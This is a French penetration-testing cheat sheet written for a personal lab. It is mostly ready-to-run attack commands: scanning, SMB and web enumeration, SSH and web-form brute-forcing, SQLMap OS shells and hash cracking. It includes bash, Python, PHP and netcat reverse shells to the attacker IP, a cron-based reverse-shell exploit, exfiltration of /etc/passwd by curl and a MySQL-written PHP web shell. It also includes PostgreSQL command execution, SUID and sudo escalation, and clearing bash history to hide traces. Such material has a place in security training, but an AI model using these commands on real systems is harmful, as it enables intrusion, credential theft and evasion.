# 💻 Commandes Essentielles - Lab de Cybersécurité

---

## 🔍 Reconnaissance & Scan

### Nmap - Scanner de réseaux

```bash
# Découverte d'hôtes sur le réseau
nmap -sn 192.168.100.0/24

# Scan rapide des ports courants
nmap -F 192.168.100.20

# Scan complet de tous les ports
nmap -p- 192.168.100.20

# Scan avec détection de version et OS
nmap -sS -sV -O -A 192.168.100.20

# Scan agressif rapide
nmap -T4 -A -v 192.168.100.20

# Scan UDP
nmap -sU --top-ports 100 192.168.100.20

# Scan avec scripts NSE spécifiques
nmap --script vuln 192.168.100.20
nmap --script smb-vuln* 192.168.100.20
nmap --script ftp-anon 192.168.100.20 -p 21

# Exporter les résultats
nmap -oA scan_results 192.168.100.20
```

### Netdiscover - Découverte ARP

```bash
# Scanner le réseau local
netdiscover -r 192.168.100.0/24

# Mode passif
netdiscover -p -r 192.168.100.0/24
```

### Masscan - Scanner ultra-rapide

```bash
# Scanner tous les ports très rapidement
masscan -p1-65535 192.168.100.20 --rate=1000

# Scanner une plage de réseau
masscan 192.168.100.0/24 -p80,443,8080 --rate=10000
```

---

## 🔑 Énumération

### Enum4linux - Énumération SMB/Samba

```bash
# Énumération complète
enum4linux -a 192.168.100.20

# Énumération des utilisateurs
enum4linux -U 192.168.100.20

# Énumération des partages
enum4linux -S 192.168.100.20
```

### SMBClient - Client SMB

```bash
# Lister les partages
smbclient -L //192.168.100.20 -N

# Se connecter à un partage
smbclient //192.168.100.20/share -U username

# Commandes dans SMB
# ls        - Lister les fichiers
# get file  - Télécharger un fichier
# put file  - Uploader un fichier
```

### DNS Enumération

```bash
# Transfert de zone DNS
dig axfr @dns-server domain.com

# Résolution DNS inverse
nmap -sL 192.168.100.0/24

# Énumération DNS
dnsenum domain.com
dnsrecon -d domain.com
```

---

## 🌐 Scan & Exploitation Web

### Nikto - Scanner de vulnérabilités web

```bash
# Scan basique
nikto -h http://192.168.100.20

# Scan avec authentification
nikto -h http://192.168.100.20 -id username:password

# Exporter les résultats
nikto -h http://192.168.100.20 -o report.html -Format html
```

### Gobuster - Brute-force de répertoires

```bash
# Recherche de répertoires
gobuster dir -u http://192.168.100.20 -w /usr/share/wordlists/dirb/common.txt

# Recherche avec extensions spécifiques
gobuster dir -u http://192.168.100.20 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Recherche de sous-domaines
gobuster dns -d domain.com -w /usr/share/wordlists/dnsmap.txt

# Avec threads et timeout personnalisés
gobuster dir -u http://192.168.100.20 -w wordlist.txt -t 50 --timeout 10s
```

### WPScan - Scanner WordPress

```bash
# Scan basique
wpscan --url http://192.168.100.20/wordpress

# Énumération des plugins vulnérables
wpscan --url http://192.168.100.20/wordpress --enumerate vp

# Énumération des utilisateurs
wpscan --url http://192.168.100.20/wordpress --enumerate u

# Brute-force des mots de passe
wpscan --url http://192.168.100.20/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

### SQLMap - Exploitation SQL Injection

```bash
# Détection d'injection SQL
sqlmap -u "http://192.168.100.20/page.php?id=1"

# Énumération des bases de données
sqlmap -u "http://192.168.100.20/page.php?id=1" --dbs

# Dump d'une table spécifique
sqlmap -u "http://192.168.100.20/page.php?id=1" -D database -T users --dump

# Obtenir un shell OS
sqlmap -u "http://192.168.100.20/page.php?id=1" --os-shell

# Avec authentification
sqlmap -u "http://192.168.100.20/page.php?id=1" --cookie="PHPSESSID=abc123"
```

### cURL - Client HTTP en ligne de commande

```bash
# Requête GET simple
curl http://192.168.100.20

# Requête POST avec données
curl -X POST -d "username=admin&password=test" http://192.168.100.20/login

# Voir les en-têtes HTTP
curl -I http://192.168.100.20

# Suivre les redirections
curl -L http://192.168.100.20

# Avec authentification
curl -u username:password http://192.168.100.20

# Envoyer un fichier
curl -F "file=@/path/to/file" http://192.168.100.20/upload
```

---

## 🔫 Exploitation

### Metasploit Framework

```bash
# Lancer Metasploit
msfconsole

# Rechercher un exploit
search vsftpd
search type:exploit platform:linux

# Utiliser un exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Configurer les options
set RHOST 192.168.100.20
set LHOST 192.168.100.10
show options

# Lancer l'exploitation
exploit
# ou
run

# Mettre en arrière-plan une session
background

# Lister les sessions
sessions -l

# Interagir avec une session
sessions -i 1

# Scanner avec Metasploit
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.0/24
run
```

### SearchSploit - Recherche d'exploits

```bash
# Rechercher un exploit
searchsploit apache 2.2

# Copier un exploit
searchsploit -m exploits/linux/remote/12345.py

# Mettre à jour la base
searchsploit -u
```

---

## 🔐 Cracking & Brute-force

### Hydra - Brute-force de mots de passe

```bash
# SSH brute-force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20

# FTP brute-force
hydra -L users.txt -P passwords.txt ftp://192.168.100.20

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.100.20 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Avec plusieurs threads
hydra -l admin -P passwords.txt -t 4 ssh://192.168.100.20
```

### John the Ripper - Cracking de hashes

```bash
# Cracker un fichier /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Format spécifique
john --format=md5 --wordlist=wordlist.txt hashes.txt

# Afficher les mots de passe crackés
john --show shadow.txt

# Mode incrémental (plus lent mais exhaustif)
john --incremental shadow.txt
```

### Hashcat - GPU password cracking

```bash
# Identifier le type de hash
hashcat --example-hashes | grep -i "md5"

# Cracker MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Cracker SHA256
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# Avec règles
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 🔌 Analyse Réseau

### Wireshark / TShark

```bash
# Capturer le trafic
tshark -i eth0

# Capturer et sauvegarder
tshark -i eth0 -w capture.pcap

# Filtrer par IP
tshark -i eth0 -Y "ip.addr == 192.168.100.20"

# Filtrer HTTP
tshark -i eth0 -Y "http"

# Analyser un fichier PCAP
tshark -r capture.pcap

# Extraire les mots de passe HTTP
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

### TCPDump

```bash
# Capturer tout le trafic
tcpdump -i eth0

# Capturer et sauvegarder
tcpdump -i eth0 -w capture.pcap

# Filtrer par hôte
tcpdump -i eth0 host 192.168.100.20

# Filtrer par port
tcpdump -i eth0 port 80

# Capturer uniquement les paquets SYN
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'
```

### Netcat - Couteau suisse réseau

```bash
# Écouter sur un port (reverse shell)
nc -lvnp 4444

# Se connecter à un port
nc 192.168.100.20 80

# Transférer un fichier (réception)
nc -lvnp 4444 > file.txt

# Transférer un fichier (envoi)
nc 192.168.100.20 4444 < file.txt

# Port scanning
nc -zv 192.168.100.20 1-1000

# Banner grabbing
echo "" | nc -v -n -w1 192.168.100.20 22
```

---

## 💣 Post-Exploitation

### Escalade de privilèges Linux

```bash
# Informations système
uname -a
cat /etc/issue
cat /etc/*-release

# Informations utilisateur
id
whoami
sudo -l

# Recherche de SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Fichiers writables
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Processus en cours
ps aux
ps aux | grep root

# Capacités (capabilities)
getcap -r / 2>/dev/null

# Historique des commandes
cat ~/.bash_history
cat ~/.mysql_history

# Fichiers sensibles
cat /etc/passwd
cat /etc/shadow
cat /etc/group
```

### LinPEAS - Script d'énumération automatique

```bash
# Télécharger LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Exécuter
chmod +x linpeas.sh
./linpeas.sh

# Exécuter et sauvegarder
./linpeas.sh | tee linpeas_output.txt
```

### Escalade de privilèges - Techniques courantes

```bash
# Sudo avec NOPASSWD
sudo -l
sudo /usr/bin/find . -exec /bin/sh \; -quit

# SUID binaries exploitation
# Exemple avec find
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
/usr/bin/find . -exec /bin/sh -p \; -quit

# Exemple avec vim
vim -c ':!/bin/sh'

# Cron jobs exploitation
cat /etc/crontab
echo 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```

---

## 📡 Transfert de Fichiers

### De Kali vers la cible

```bash
# Python HTTP server (sur Kali)
python3 -m http.server 8000

# Sur la cible, télécharger
wget http://192.168.100.10:8000/file.txt
curl http://192.168.100.10:8000/file.txt -o file.txt
```

### De la cible vers Kali

```bash
# Netcat (sur Kali, recevoir)
nc -lvnp 4444 > file.txt

# Sur la cible, envoyer
nc 192.168.100.10 4444 < file.txt

# Avec curl (POST)
curl -X POST http://192.168.100.10:8000/upload -F "file=@/etc/passwd"
```

### SCP / SFTP

```bash
# Copier vers la cible
scp file.txt user@192.168.100.20:/tmp/

# Copier depuis la cible
scp user@192.168.100.20:/tmp/file.txt .

# Répertoire complet
scp -r /path/to/dir user@192.168.100.20:/tmp/
```

---

## 🔐 Reverse Shells

### Bash Reverse Shell

```bash
# Sur Kali (listener)
nc -lvnp 4444

# Sur la cible
bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
```

### Python Reverse Shell

```bash
# Sur la cible
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP Reverse Shell

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'");
?>
```

### Netcat Reverse Shell

```bash
# Sur Kali
nc -lvnp 4444

# Sur la cible
nc -e /bin/bash 192.168.100.10 4444

# Si -e n'est pas disponible
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.10 4444 >/tmp/f
```

### Shell Upgrade (TTY)

```bash
# Python TTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z (background)
# Sur Kali
stty raw -echo; fg

# Sur le shell
export TERM=xterm
export SHELL=/bin/bash
```

---

## 🗄️ Bases de Données

### MySQL

```bash
# Se connecter
mysql -u root -p
mysql -u root -h 192.168.100.20

# Commandes MySQL
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
SELECT user, password FROM mysql.user;

# Dump d'une base
mysqldump -u root -p database_name > dump.sql

# Exécuter des commandes système
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

### PostgreSQL

```bash
# Se connecter
psql -U postgres -h 192.168.100.20

# Commandes PostgreSQL
\l              # Lister les bases
\c database     # Se connecter à une base
\dt             # Lister les tables
SELECT * FROM users;

# RCE via PostgreSQL
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

---

## 🌐 Utilitaires Réseau

### Scan de Ports Manuel

```bash
# Test de connexion TCP
timeout 1 bash -c "echo >/dev/tcp/192.168.100.20/80" && echo "Port 80 ouvert"

# Scan simple en bash
for port in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/192.168.100.20/$port" 2>/dev/null && echo "Port $port ouvert"
done
```

### ARP

```bash
# Afficher la table ARP
arp -a

# Scanner le réseau avec ARP
arp-scan -l
arp-scan 192.168.100.0/24
```

### Route & Routing

```bash
# Afficher la table de routage
route -n
ip route show

# Ajouter une route
route add -net 10.0.0.0/24 gw 192.168.100.1
```

---

## 🔎 Recherche de Fichiers

### Find

```bash
# Fichiers modifiés récemment (24h)
find / -mtime 0 2>/dev/null

# Fichiers contenant un mot spécifique
find / -type f -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null

# Fichiers appartenant à un utilisateur
find / -user www-data 2>/dev/null

# Fichiers de plus de 10MB
find / -size +10M 2>/dev/null
```

### Grep

```bash
# Recherche récursive
grep -r "password" /var/www/html/

# Ignorer la casse
grep -ri "admin" /etc/

# Afficher le numéro de ligne
grep -rn "config" /etc/

# Recherche de pattern
grep -rE "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" /etc/
```

---

## 📝 Manipulation de Texte

### Sed

```bash
# Remplacer du texte
sed 's/old/new/g' file.txt

# Supprimer une ligne
sed '/pattern/d' file.txt

# Extraire des lignes
sed -n '10,20p' file.txt
```

### Awk

```bash
# Extraire une colonne
awk '{print $1}' file.txt

# Filtrer par condition
awk '$3 > 1000 {print $0}' file.txt

# Extraire IPs
awk '{print $1}' access.log | sort | uniq
```

### Cut

```bash
# Extraire des champs
cut -d: -f1 /etc/passwd

# Extraire des caractères
cut -c1-10 file.txt
```

---

## 💾 Compression & Archives

### Tar

```bash
# Créer une archive
tar -czf archive.tar.gz /path/to/dir

# Extraire
tar -xzf archive.tar.gz

# Lister le contenu
tar -tzf archive.tar.gz
```

### Zip / Unzip

```bash
# Créer un zip
zip -r archive.zip /path/to/dir

# Extraire
unzip archive.zip

# Lister
unzip -l archive.zip
```

---

## 🎯 Astuces Pratiques

### Historique Bash

```bash
# Désactiver l'historique (ne pas laisser de traces)
unset HISTFILE

# Effacer l'historique
history -c

# Ne pas enregistrer une commande (ajouter un espace au début)
 cat /etc/shadow
```

### Variables d'Environnement

```bash
# IP de l'attaquant
export LHOST=192.168.100.10

# IP de la cible
export RHOST=192.168.100.20

# Port
export LPORT=4444

# Utilisation
nc -lvnp $LPORT
```

### One-Liners Utiles

```bash
# Scanner un réseau et afficher les IPs actives
nmap -sn 192.168.100.0/24 -oG - | grep "Up" | cut -d' ' -f2

# Extraire tous les emails d'un fichier
grep -Eiorh "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}" file.txt

# Trouver tous les fichiers SUID
find / -perm -4000 -ls 2>/dev/null

# Reverse shell en une ligne
bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'
```

---

## 🔗 Ressources Supplémentaires

### Cheat Sheets
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks** : https://book.hacktricks.xyz/
- **GTFOBins** : https://gtfobins.github.io/
- **LOLBAS** : https://lolbas-project.github.io/

### Documentation Officielle
- **Nmap** : https://nmap.org/book/man.html
- **Metasploit** : https://docs.metasploit.com/
- **Burp Suite** : https://portswigger.net/burp/documentation

---

**📚 Ce guide est un aide-mémoire pour votre lab. Bookmark-le et consultez-le régulièrement !**

*Dernière mise à jour : Janvier 2025*